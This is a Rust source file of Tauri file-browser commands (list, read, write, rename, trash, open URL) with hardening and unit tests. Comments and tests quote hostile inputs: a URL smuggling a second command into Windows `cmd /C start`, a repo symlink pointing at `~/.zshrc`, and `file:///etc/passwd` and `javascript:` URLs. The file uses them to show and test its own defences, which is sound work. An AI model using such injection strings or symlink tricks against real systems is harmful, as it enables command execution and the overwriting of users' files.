// Filesystem commands for the file-browser panel: list a directory, read a
// file for viewing/editing, and write it back.
//
// Everything that touches the disk or spawns a helper process is
// `#[tauri::command(async)]`, which runs it on the async runtime instead of
// INLINE on the IPC/main thread (the default for a sync command). A directory
// listing on a cold/network volume, a 2 MB read, or a `trash::delete` is easily
// long enough to be felt as a frozen window. `get_root`/`home_dir` are pure env
// lookups and stay sync — the hop would cost more than the work.

use std::cmp::Ordering;
use std::path::PathBuf;
use std::time::UNIX_EPOCH;

use serde::Serialize;

#[derive(Serialize)]
pub struct Entry {
    name: String,
    path: String,
    is_dir: bool,
}

#[derive(Serialize)]
pub struct Listing {
    entries: Vec<Entry>,
}

#[derive(Serialize)]
pub struct FileData {
    content: String,
    /// last-modified time in milliseconds since the epoch (for conflict detection)
    mtime: f64,
}

/// The folder the app is "opened in". In dev, `tauri dev` runs the binary from
/// `src-tauri/`, so step up one level to the real project root.
pub fn project_root() -> PathBuf {
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("/"));
    if cwd.file_name().map(|n| n == "src-tauri").unwrap_or(false) {
        cwd.parent().map(|p| p.to_path_buf()).unwrap_or(cwd)
    } else {
        cwd
    }
}

fn mtime_ms(meta: &std::fs::Metadata) -> f64 {
    meta.modified()
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs_f64() * 1000.0)
        .unwrap_or(0.0)
}

#[tauri::command]
pub fn get_root() -> String {
    project_root().to_string_lossy().into_owned()
}

/// The user's home directory, if the environment exposes one. THE single place
/// this is worked out — a GUI launch gives no shell cwd but does give `HOME`
/// (`USERPROFILE` on Windows), and four separate copies of that little bit of
/// knowledge is how three of them end up fixed and the fourth doesn't.
pub fn home() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
        .filter(|p| !p.as_os_str().is_empty())
}

/// The home directory as a string, falling back to the filesystem root — for the
/// callers that need *some* directory and can't do anything with `None`.
pub fn home_or_root() -> String {
    home()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|| "/".to_string())
}

/// The user's home directory — offered as the default startup folder on first run.
#[tauri::command]
pub fn home_dir() -> String {
    home_or_root()
}

/// Reveal a path in the OS file manager (Finder / Explorer / default), selecting
/// it where the platform supports it.
#[tauri::command(async)]
pub fn reveal_path(path: String) -> Result<(), String> {
    use std::process::Command;
    #[cfg(target_os = "macos")]
    let spawned = Command::new("open").args(["-R", &path]).spawn();
    #[cfg(target_os = "windows")]
    let spawned = Command::new("explorer").arg(format!("/select,{}", path)).spawn();
    #[cfg(all(unix, not(target_os = "macos")))]
    let spawned = {
        // Linux has no standard "reveal + select"; open the containing folder.
        let dir = std::path::Path::new(&path)
            .parent()
            .map(|p| p.to_path_buf())
            .unwrap_or_else(|| std::path::PathBuf::from(&path));
        Command::new("xdg-open").arg(dir).spawn()
    };
    spawned.map(|_| ()).map_err(|e| e.to_string())
}

/// Open an http(s) URL in the user's default browser. Only web URLs are allowed —
/// never `file://`, `javascript:`, etc. — because these URLs come from TERMINAL
/// OUTPUT: `URL_RE` (`src/lib/paths.ts`) linkifies every match, so anything an
/// agent runs, or any file it prints, can put a clickable link on screen.
///
/// The launcher must never be a shell. `cmd /C start` re-parses `&`, `|`, `^`,
/// `<`, `>` as command separators AND expands `%VAR%`, and Rust's `Command`
/// quotes a Windows argument only when it contains a space or tab — so a
/// space-free `http://ok.com&\\host\share\evil.exe` was appended raw and ran a
/// second command on click. (Rust's CVE-2024-24576 batch escaping does not help:
/// it fires only when the *program* is a `.bat`/`.cmd`, not when you invoke
/// cmd.exe yourself.) `tauri_plugin_opener::open_url` goes through
/// `ShellExecuteExW` instead — no shell, and it's a free function, so the plugin
/// needs no registration or capability entry. `open`/`xdg-open` already receive
/// the URL as a single argv element with no shell, so those arms are unchanged.
#[tauri::command(async)]
pub fn open_url(url: String) -> Result<(), String> {
    if !(url.starts_with("http://") || url.starts_with("https://")) {
        return Err("Refusing to open a non-http(s) URL.".into());
    }
    // Defence in depth: control characters have no legitimate place in a URL and
    // are what a line-splitting trick needs, and `URL_RE`'s `[^\s...]` class does
    // NOT exclude them. `&` is deliberately NOT rejected — it is ordinary
    // query-string syntax, no shell sees it any more, and rejecting it here would
    // fail *silently*, since the click handler swallows the error.
    if url.chars().any(char::is_control) {
        return Err("Refusing to open a URL containing control characters.".into());
    }
    #[cfg(target_os = "windows")]
    return tauri_plugin_opener::open_url(&url, None::<&str>).map_err(|e| e.to_string());
    #[cfg(not(target_os = "windows"))]
    {
        use std::process::Command;
        #[cfg(target_os = "macos")]
        let spawned = Command::new("open").arg(&url).spawn();
        #[cfg(all(unix, not(target_os = "macos")))]
        let spawned = Command::new("xdg-open").arg(&url).spawn();
        spawned.map(|_| ()).map_err(|e| e.to_string())
    }
}

/// Rename / move a filesystem entry. Refuses to clobber an existing target.
#[tauri::command(async)]
pub fn rename_path(from: String, to: String) -> Result<(), String> {
    if std::path::Path::new(&to).exists() {
        return Err(format!("“{}” already exists", basename(&to)));
    }
    std::fs::rename(&from, &to).map_err(|e| e.to_string())
}

/// Create an empty file or a directory. Errors if the path already exists.
#[tauri::command(async)]
pub fn create_path(path: String, is_dir: bool) -> Result<(), String> {
    let p = std::path::Path::new(&path);
    if p.exists() {
        return Err(format!("“{}” already exists", basename(&path)));
    }
    if is_dir {
        std::fs::create_dir_all(p).map_err(|e| e.to_string())
    } else {
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
        }
        std::fs::File::create(p).map(|_| ()).map_err(|e| e.to_string())
    }
}

/// Move a path to the OS trash — recoverable, never a permanent delete.
#[tauri::command(async)]
pub fn delete_path(path: String) -> Result<(), String> {
    trash::delete(&path).map_err(|e| e.to_string())
}

/// Last path segment, on either separator flavour. Shared: used for user-facing
/// error messages here, and for classifying argv[0] / a shell program in `pty`.
pub fn basename(p: &str) -> &str {
    p.trim_end_matches(['/', '\\'])
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(p)
}

#[tauri::command(async)]
pub fn list_dir(path: Option<String>) -> Result<Listing, String> {
    let dir = path.map(PathBuf::from).unwrap_or_else(project_root);

    let mut entries: Vec<Entry> = Vec::new();
    for e in std::fs::read_dir(&dir).map_err(|e| e.to_string())? {
        let e = e.map_err(|e| e.to_string())?;
        let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
        entries.push(Entry {
            name: e.file_name().to_string_lossy().into_owned(),
            path: e.path().to_string_lossy().into_owned(),
            is_dir,
        });
    }

    // Directories first, then alphabetical (case-insensitive).
    entries.sort_by(|a, b| match (a.is_dir, b.is_dir) {
        (true, false) => Ordering::Less,
        (false, true) => Ordering::Greater,
        _ => a.name.to_lowercase().cmp(&b.name.to_lowercase()),
    });

    Ok(Listing { entries })
}

/// Byte size of a regular file (follows symlinks). Used by the media viewer to
/// guard against decoding an enormous image into the webview — the asset protocol
/// streams the bytes, so `read_file`'s size cap never runs on that path.
#[tauri::command(async)]
pub fn file_size(path: String) -> Result<f64, String> {
    let meta = std::fs::metadata(&path).map_err(|e| e.to_string())?;
    Ok(meta.len() as f64)
}

#[tauri::command(async)]
pub fn read_file(path: String) -> Result<FileData, String> {
    // `metadata` follows symlinks; reject anything that isn't a regular file
    // (a FIFO/device in an opened repo would otherwise block the read forever).
    let meta = std::fs::metadata(&path).map_err(|e| e.to_string())?;
    if !meta.file_type().is_file() {
        return Err("Not a regular file.".into());
    }
    if meta.len() > 2_000_000 {
        return Err("File too large to open (over 2 MB).".into());
    }
    let bytes = std::fs::read(&path).map_err(|e| e.to_string())?;
    // Crude binary sniff: a NUL byte in the head means "not text".
    if bytes.iter().take(8000).any(|&b| b == 0) {
        return Err("Binary file — not shown.".into());
    }
    // Reject non-UTF-8 rather than lossily decoding — a lossy round-trip on
    // save would permanently corrupt the file.
    let content =
        String::from_utf8(bytes).map_err(|_| "File is not valid UTF-8 text.".to_string())?;
    Ok(FileData {
        content,
        mtime: mtime_ms(&meta),
    })
}

/// The exact wording `write_file` uses to report a stale-mtime conflict.
///
/// This is a CROSS-LANGUAGE CONTRACT. `isDiskConflict` in `src/lib/api.ts` tests
/// `/changed on disk/i` against it to decide whether a failed save is
/// recoverable — that is what puts the Overwrite / Reload buttons on screen in
/// `FileEditor.tsx` instead of a dead-end error. Reword this and that escape
/// hatch silently disappears. Change both sides together; the test below and
/// `src/lib/api.test.ts` are the tripwire.
pub const CONFLICT_MSG: &str = "The file changed on disk since you opened it.";

#[tauri::command(async)]
pub fn write_file(
    path: String,
    content: String,
    expected_mtime: Option<f64>,
) -> Result<f64, String> {
    // Refuse to write THROUGH a symlink. A malicious repo can commit a symlink
    // (e.g. `NOTES.md -> ~/.zshrc`) that the tree shows as an ordinary in-repo
    // file; `std::fs::write` follows it, so a save would silently clobber the
    // target outside the repo. `symlink_metadata` does not follow the leaf.
    if let Ok(meta) = std::fs::symlink_metadata(&path) {
        if meta.file_type().is_symlink() {
            return Err("Refusing to write through a symlink (the file points elsewhere).".into());
        }
    }
    // Conflict detection: if the file changed on disk since it was loaded
    // (e.g. the agent edited it), refuse to clobber it.
    if let Some(expected) = expected_mtime {
        if let Ok(meta) = std::fs::metadata(&path) {
            if mtime_ms(&meta) > expected + 1.0 {
                return Err(CONFLICT_MSG.into());
            }
        }
    }
    std::fs::write(&path, &content).map_err(|e| e.to_string())?;
    let meta = std::fs::metadata(&path).map_err(|e| e.to_string())?;
    Ok(mtime_ms(&meta))
}

#[cfg(test)]
mod tests {
    use super::*;

    // These guards are the fixes for previously-reported hostile-repo findings,
    // and until now each was signed off with "cargo check green" rather than a
    // test that pins it. A refactor that dropped one would have passed CI.

    #[test]
    #[cfg(unix)] // CI runs ubuntu-22.04; Windows symlinks need Developer Mode.
    fn refuses_to_write_through_a_symlink() {
        let d = tempfile::tempdir().unwrap();
        let target = d.path().join("outside.txt");
        let link = d.path().join("NOTES.md");
        std::fs::write(&target, "original").unwrap();
        std::os::unix::fs::symlink(&target, &link).unwrap();

        let r = write_file(link.to_string_lossy().into_owned(), "evil".into(), None);

        assert!(r.is_err(), "a symlink leaf must be refused");
        // The point of the guard: the file OUTSIDE the repo is untouched.
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "original");
    }

    #[test]
    fn refuses_to_clobber_a_file_that_changed_on_disk() {
        let d = tempfile::tempdir().unwrap();
        let p = d.path().join("a.txt");
        std::fs::write(&p, "on disk").unwrap();
        // A baseline "from the epoch" is older than any real mtime, so the
        // conflict branch fires deterministically — no sleeping, no flake.
        let err = write_file(p.to_string_lossy().into_owned(), "mine".into(), Some(0.0)).unwrap_err();
        assert_eq!(err, CONFLICT_MSG);
        assert_eq!(std::fs::read_to_string(&p).unwrap(), "on disk", "refused save must not write");
    }

    // Mirrors src/lib/api.test.ts. If this fails, the frontend's
    // `/changed on disk/i` no longer recognises our conflict error and the
    // Overwrite/Reload recovery in FileEditor.tsx has become unreachable.
    #[test]
    fn conflict_message_matches_the_frontend_predicate() {
        assert!(
            CONFLICT_MSG.to_lowercase().contains("changed on disk"),
            "src/lib/api.ts isDiskConflict tests /changed on disk/i against: {CONFLICT_MSG}"
        );
    }

    #[test]
    fn writes_and_reads_back_with_a_matching_mtime() {
        let d = tempfile::tempdir().unwrap();
        let p = d.path().join("a.txt").to_string_lossy().into_owned();
        let mtime = write_file(p.clone(), "first".into(), None).unwrap();
        assert!(mtime > 0.0);
        let data = read_file(p.clone()).unwrap();
        assert_eq!(data.content, "first");
        // Saving against the mtime we just read is not a conflict.
        assert!(write_file(p, "second".into(), Some(data.mtime)).is_ok());
    }

    #[test]
    fn read_file_rejects_anything_that_is_not_a_regular_file() {
        // A directory takes the same branch a FIFO/device would, with no
        // platform-specific setup — an unhandled FIFO would block the read forever.
        let d = tempfile::tempdir().unwrap();
        assert!(read_file(d.path().to_string_lossy().into_owned()).is_err());
    }

    #[test]
    fn read_file_rejects_oversized_binary_and_non_utf8_files() {
        let d = tempfile::tempdir().unwrap();
        let big = d.path().join("big.txt");
        std::fs::write(&big, vec![b'a'; 2_000_001]).unwrap();
        assert!(read_file(big.to_string_lossy().into_owned()).is_err(), "over the 2 MB cap");

        let bin = d.path().join("bin.dat");
        std::fs::write(&bin, [b'a', 0, b'b']).unwrap();
        assert!(read_file(bin.to_string_lossy().into_owned()).is_err(), "NUL byte in the head");

        // Invalid UTF-8 with NO NUL, so this reaches the UTF-8 branch rather
        // than being caught earlier by the binary sniff. Lossy decoding here
        // would corrupt the file on the next save.
        let latin = d.path().join("latin1.txt");
        std::fs::write(&latin, [0xFF, 0xFE, 0x41]).unwrap();
        assert!(read_file(latin.to_string_lossy().into_owned()).is_err());
    }

    #[test]
    fn create_and_rename_refuse_to_clobber() {
        let d = tempfile::tempdir().unwrap();
        let a = d.path().join("a.txt");
        let b = d.path().join("b.txt");
        std::fs::write(&a, "a").unwrap();
        std::fs::write(&b, "b").unwrap();
        assert!(create_path(a.to_string_lossy().into_owned(), false).is_err());
        assert!(rename_path(a.to_string_lossy().into_owned(), b.to_string_lossy().into_owned()).is_err());
        assert_eq!(std::fs::read_to_string(&b).unwrap(), "b", "target must survive");
    }

    // Pins the fix for the Windows `cmd /C start` injection: these URLs come
    // from terminal output, so the rejection branches matter. Only rejections
    // are tested — a success case would spawn a real browser on the CI runner.
    #[test]
    fn open_url_rejects_non_web_schemes_and_control_characters() {
        for bad in ["file:///etc/passwd", "javascript:alert(1)", "ftp://x/y", ""] {
            assert!(open_url(bad.into()).is_err(), "must refuse {bad:?}");
        }
        assert!(open_url("http://ok.com/\r\nX".into()).is_err(), "control chars");
        assert!(open_url("http://ok.com/\u{0}".into()).is_err(), "NUL");
    }

    #[test]
    fn basename_handles_both_separators() {
        assert_eq!(basename("/a/b/c.txt"), "c.txt");
        assert_eq!(basename("C:\\a\\b.txt"), "b.txt");
        assert_eq!(basename("/a/b/"), "b");
        assert_eq!(basename("bare"), "bare");
    }
}
